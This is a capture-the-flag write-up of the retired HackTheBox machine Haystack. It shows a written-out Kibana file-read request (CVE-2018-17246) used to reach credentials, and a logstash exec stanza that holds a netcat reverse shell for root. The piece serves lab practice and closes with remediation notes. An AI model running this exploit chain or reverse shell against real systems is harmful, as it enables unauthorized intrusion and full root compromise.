HTB Haystack: Kibana LFI to creds, logstash config to root

retired-machineeasy

Haystack is a retired HackTheBox easy Linux machine set in the Elastic stack. Synopsis: Kibana 6.4.2 file read (CVE-2018-17246) exposes credentials and config, and a writable logstash pipeline executed as root closes it.

$ Enumeration — version the stack

# nmap: Elasticsearch plus Kibana
nmap -sC -sV -oN haystack.nmap 10.10.10.115   # 9200 elasticsearch, 5601 kibana 6.4.2

Kibana 6.4.2 maps to CVE-2018-17246, a console API file-read. Niche-versioned middleware is the whole attack surface here.

$ Foothold — Kibana LFI to creds

# bash: console LFI, then SSH
# Kibana console API file read (CVE-2018-17246):
curl -s "http://10.10.10.115:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../etc/passwd"
# pivot to app configs/key material -> credentials -> SSH as the service user

Read /etc/passwd to confirm, then aim at configs and key material — file reads become credential reads. SSH in as the low-privilege service user.

$ Privilege escalation — writable logstash pipeline

# bash: inject exec into the pipeline
ps aux | grep -i logstash   # running as root
ls -l /etc/logstash/conf.d/   # writable by our user
cat > /etc/logstash/conf.d/privesc.conf <<EOF
input { stdin { } }
filter { }
output { exec { command => "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 4446 >/tmp/f &" } }
EOF
nc -lvnp 4446   # wait for pipeline reload -> root

Logstash running as root executes pipeline configs from a directory the compromised user can write to. Append an exec stanza, wait for reload, catch root. Privileged services consuming writable config are root by delegation. Flag values redacted per HTB rules; earn them in your own lab.

$ Dead ends

Attacking Elasticsearch directly (the Kibana LFI is the intended lens) and writing the stanza in the wrong syntax (match the running config format, then reload).

$ Remediation notes

Patch Kibana past the LFI, restrict stack ports to management networks, and lock pipeline dirs to root-only writes. Written by Lucky Thandel.
